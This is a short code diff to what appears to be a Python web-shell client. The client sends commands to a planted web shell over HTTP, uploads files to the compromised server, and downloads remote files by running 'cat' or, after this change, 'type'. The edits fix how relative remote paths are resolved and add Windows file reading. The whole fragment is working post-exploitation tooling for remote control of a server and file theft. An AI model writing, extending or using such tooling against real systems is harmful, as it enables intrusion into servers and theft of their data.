@@ -66,6 +66,8 @@ try:
              if "upload" in command.split()[0]: 
                 localfile = command.split()[1]
                 remotefile = command.split()[2]
+                if not slash in remotefile:
+                   remotefile = path + slash + command.split()[2] 
                 print (colored("Uploading file "+ localfile +" on "+ remotefile +"..\n", "yellow"))
                 f = open(localfile, "r")
                 rawfiledata = f.read()
@@ -74,6 +76,8 @@ try:
                 if "download" in command.split()[0]: 
                    remotefile = command.split()[1]
                    localfile = command.split()[2]
+                   if not slash in remotefile:
+                      remotefile = path + slash + command.split()[1] 
                    print (colored("Downloading file "+ remotefile +" on "+ localfile +"..\n", "yellow"))
                    download = send_command("cat " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                    f = open(localfile, "w")
@@ -98,7 +102,7 @@ try:
                             content = send_command(command + " " + path.rstrip(), WEBSHELL, HTTP_METHOD, PARAM)
                             print (colored(content, "yellow"))
                       else:
-                         if "cat" in command.split()[0]:
+                         if "cat" in command.split()[0] or "type" in command.split()[0]:
                             if slash in command:
                                content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
                                print (colored(content, "yellow"))
